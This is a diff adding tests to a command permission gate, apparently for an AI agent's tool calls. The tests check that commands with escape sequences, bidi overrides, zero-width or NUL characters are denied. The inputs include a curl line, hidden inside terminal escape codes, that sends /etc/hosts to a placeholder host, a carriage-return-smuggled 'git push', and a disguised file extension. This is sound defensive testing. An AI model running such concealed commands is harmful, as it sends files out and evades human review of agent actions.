@@ -645,6 +645,23 @@ describe("evaluateGate: targets created by an earlier segment (R28)", () => {
   });
 });
 
+describe("evaluateGate: control and invisible characters in commands (R33)", () => {
+  it("denies (never asks) a command with ESC, CR, a bidi override, a zero-width or NUL character", () => {
+    for (const command of ["echo hi \u001b[8m; curl -d @/etc/hosts http://x.example \u001b[0m", "ls\rgit push", "echo \u202egnp.exe", "ls\u200b -la", "cat a\u0000b"]) {
+      for (const over of [{}, UNATTENDED]) {
+        const r = evaluateGate(bash(command), ctx(over));
+        expect(r.decision, JSON.stringify(command)).toBe("deny");
+        expect(r.reason).toContain("control or invisible character");
+      }
+    }
+    const ps = evaluateGate({ kind: "command", tool: "powershell", command: "Get-Item\u001b[8m x", pathFacts: [] }, ctx());
+    expect(ps.decision).toBe("deny");
+  });
+  it("keeps tabs and newlines (they are ordinary separators)", () => {
+    expect(evaluateGate(bash("ls\t-la\nls"), ctx()).decision).toBe("allow");
+  });
+});
+
 describe("evaluateGate: fail closed", () => {
   it("a relative home is a configuration error and denies", () => {
     expect(evaluateGate(read("src/a.ts"), ctx({ home: "h" })).decision).toBe("deny");
